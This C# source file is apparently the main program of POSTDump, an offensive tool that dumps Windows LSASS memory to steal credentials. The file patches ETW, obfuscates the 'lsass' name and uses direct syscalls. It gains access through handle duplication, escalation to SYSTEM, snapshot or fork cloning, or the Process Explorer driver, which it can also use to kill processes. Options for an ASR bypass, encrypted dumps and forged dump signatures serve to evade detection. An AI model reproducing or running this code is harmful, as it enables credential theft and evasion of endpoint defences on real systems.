using System;
using System.Linq;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Data = POSTMiniDump.Data;
using MinidumpUtils = POSTMiniDump.Utils;
using System.IO;

namespace POSTDump
{
    public class Postdump
    {

        public static ISyscall isyscall = new ISyscall();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);

        static void Help()
        {
            Console.WriteLine(@"" +
                "--encrypt, -e - Encrypt dump in-memory\n" +
                "--signature, -s - Generate invalid Minidump signature\n" +
                "--outfile, -o - Output file where to write dump\n" +
                "--snap - Use snapshot technic\n" +
                "--fork - Use fork technic [default]\n" +
                "--duplicate-elevate - Look for existing lsass handle to duplicate and elevate\n" +
                "--elevate-handle - Open a handle to LSASS with low privileges and duplicate it to gain higher privileges\n" +
                "--live - Parse creds from memory without writing into file on disk\n" +
                "--fromfile - Parse creds from dump file\n" + 
                "--asr - Attempt LSASS dump using ASR bypass (no signature/encrypt available)\n" +
                "--driver, -d - Use Process Explorer driver to open lsass handle and dump lsass\n" +
                "--kill, -k [processID] - Use Process Explorer driver to kill process and exit\n" +
                "--help, -h - Display help" +
                "");
            return;
        }
      
        static void Main(string[] args) {

            string filename = System.Environment.MachineName + "_" + DateTime.Now.ToString("ddMMyyyy_HH-mm") + ".dmp";
            bool Encrypt = false;
            bool Signature = false;
            bool Elevate = false;
            bool driver = false;
            bool Kill = false;
            bool Asr = false;
            bool Live = false;
            bool fromfile = false;
            string FileToParse = string.Empty;
            string Output = string.Empty;
            int processid = 0;
            string tech = "snapshot";

            foreach (string arg in args)
            {
                if (arg.Equals("--signature"))
                {
                    Signature = true;
                }
                if (arg.Equals("--encrypt"))
                {
                    Encrypt = true;
                }
                if (arg.Equals("--snap"))
                {
                    tech = "snapshot";
                }
                if (arg.Equals("--fork"))
                {
                    tech = "fork";
                }
                if (arg.Equals("--elevate-handle"))
                {
                    Elevate = true;
                }
                if (arg.Equals("--duplicate-elevate"))
                {
                    tech = "duplicate";
                }
                if (arg.Equals("--outfile"))
                {
                    int i = Array.IndexOf(args, arg);
                    Output = args[i + 1];
                }
                if (arg.Equals("--driver"))
                {
                    driver = true;
                }
                if (arg.Equals("--kill"))
                {
                    Kill = true;
                    int i = Array.IndexOf(args, arg);
                    processid = int.Parse(args[i + 1]);
                }
                if (arg.Equals("--asr"))
                {
                    Asr = true;
                }
                if (arg.Equals("--live"))
                {
                    Live = true;
                }
                if (arg.Equals("--fromfile"))
                {
                    fromfile = true;
                    int i = Array.IndexOf(args, arg);
                    FileToParse = args[i + 1];
                }
                if (arg.Equals("--help") || arg.Equals("-h"))
                {
                    Help();
                    return;
                }
            }

            if (Output.Equals(string.Empty))
            {
                Output = filename;
            }

            isyscall.PatchETW();

            string ProcName = "l" + "sa" + "ss";
            Process proc = Process.GetProcessesByName(ProcName)[0];
            int pid = proc.Id;

            IntPtr procHandle = IntPtr.Zero;
            IntPtr dumpHandle = IntPtr.Zero;
            IntPtr snapHandle = IntPtr.Zero;
            uint desiredAccess = 0;
            bool successTech = false;
            bool successDump = false;

            ulong region_size = Data.DUMP_MAX_SIZE;
            Data.dump_context dc = new Data.dump_context();
            dc.DumpMaxSize = region_size;
            dc.BaseAddress = IntPtr.Zero;
            dc.rva = 0;
            dc.Signature = Data.MINIDUMP_SIGNATURE;
            dc.Version = Data.MINIDUMP_VERSION;
            dc.ImplementationVersion = Data.MINIDUMP_IMPL_VERSION;

            if (fromfile)
            {
                Console.WriteLine("Parsing file " + FileToParse);
                Minidump.Program.Main(dc.BaseAddress, dc.rva, FileToParse);
                return;
            }

            if (Asr)
            {
                ASR.Run();
                return;
            }

            if (processid > 0)
            {
                if (!Process.GetProcesses().Any(x => x.Id == processid))
                {
                    Console.WriteLine("Invalid process id");
                    return;
                }
                if (Kill)
                {
                    Driver.Kill(processid, out dc.hProcess, false);
                    return;
                }
            }

            if (driver)
            {
                Driver.Kill(0, out dc.hProcess, true);
            }

            //Allocate memory for dump
            IntPtr ntallocptr = isyscall.GetSyscallPtr("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory NTAVM = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntallocptr, typeof(NtAllocateVirtualMemory));
            Data.NTSTATUS status = NTAVM(new IntPtr(-1), ref dc.BaseAddress, IntPtr.Zero, ref region_size, 0x1000, 0x04); //MEM_COMMIT, PAGE_READWRITE
            if (status != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Could not allocate memory for the dump!");
                return;
            }

            // Skip this part if driver technic used
            if (dc.hProcess == IntPtr.Zero)
            {
                if (Elevate)
                {
                    if (!Handle.GetProcessHandle(pid, out procHandle, (uint)0x1000)) //PROCESS_QUERY_LIMITED_INFORMATION
                    {
                        //Console.WriteLine("Open process failed!2");
                        Console.WriteLine("Open process failed!");
                        return;
                    }

                    bool system = Handle.escalate_to_system();
                    if (!system)
                    {
                        //Console.WriteLine("GetSystem failed!");
                        Console.WriteLine("GetSystem failed!");
                        return;
                    }

                    if (tech == "snapshot")
                    {
                        desiredAccess = (uint)0x0400 | (uint)0x0080; //PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS
                    }
                    else if (tech == "fork")
                    {
                        desiredAccess = (uint)0x0080; //PROCESS_CREATE_PROCESS
                    }

                    if (!Handle.ElevateHandle(procHandle, desiredAccess, 0, out dumpHandle))
                    {
                        Console.WriteLine("Elevate handle failed.");
                        return;
                    }

                    Console.WriteLine("Elevate handle success.");
                }

                if (tech == "snapshot")
                {
                    if (!Elevate)
                    {
                        if (!Handle.GetProcessHandle(pid, out dumpHandle, (uint)0x0400 | (uint)0x0080)) //PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS
                        {
                            Console.WriteLine("Getting lsass handle using snapshot failed!");
                            return;
                        }
                    }

                    successTech = Handle.Snapshot(dumpHandle, out dc.hProcess, out snapHandle);
                }

                else if (tech == "fork")
                {
                    if (!Elevate)
                    {
                        if (!Handle.GetProcessHandle(pid, out dumpHandle, (uint)0x0400 | (uint)0x0080)) //PROCESS_CREATE_PROCESS
                        {
                            if (!Handle.GetProcessHandle(pid, out dumpHandle, (uint)0x1000 | (uint)0x0080)) //if fail, try with PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_CREATE_PROCESS
                            {
                                Console.WriteLine("Getting lsass handle using fork failed!");
                                return;
                            }
                        }
                    }

                    successTech = Handle.Fork(dumpHandle, out dc.hProcess);
                }

                else if (tech == "duplicate")
                {
                    List<IntPtr> hDupHandles = Handle.FindDupHandles((int)pid);
                    if (hDupHandles.Count == 0)
                    {
                        Console.WriteLine("No handle to duplicate found.");
                        return;
                    }

                    if (!Handle.escalate_to_system())
                    {
                        Console.WriteLine("GetSystem failed!");
                        return;
                    }

                    desiredAccess = 0x1000 | 0x0010; //PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ
                    foreach (IntPtr hDuped in hDupHandles)
                    {
                        if (Handle.ElevateHandle(hDuped, desiredAccess, 0, out dc.hProcess))
                        {
                            successTech = true;
                            Console.WriteLine("Elevate handle success.");
                            break;
                        }
                    }
                }

                if (!successTech)
                {
                    Console.WriteLine($"{tech} failed.");
                    return;
                }
            }

            if (dc.hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Could not open a handle!");
                return;
            }
            
            successDump = POSTMiniDump.MiniDump.POSTDumpWriteDump(dc, Signature, Encrypt);

            if (!successDump)
            {
                Console.WriteLine("Dump failed !");
                return;
            }
            else
            {
                Console.WriteLine("Dump success !");
            }

            if (Live)
            {
                Minidump.Program.Main(dc.BaseAddress, dc.rva);
            }
            else
            {
                var success = MinidumpUtils.WriteFile(Output, dc.BaseAddress, dc.rva, out IntPtr hFile);
                if (success)
                {
                    Console.WriteLine($"Dump saved to {Output}");
                    if (Signature && Encrypt)
                    {
                        Console.WriteLine($"The dump has an invalid signature and is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type both");
                    }
                    else if (Signature)
                    {
                        Console.WriteLine($"The dump has an invalid signature, to restore it run:\npython3 dump-restore.py {Output} --type restore");
                    }
                    else if (Encrypt)
                    {
                        Console.WriteLine($"The dump is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type decrypt");
                    }
                }
            }

            Handle.cleanup(dc.hProcess, tech, snapHandle);

            if (dc.BaseAddress != IntPtr.Zero)
                MinidumpUtils.erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);

            return;
        }
    }
}

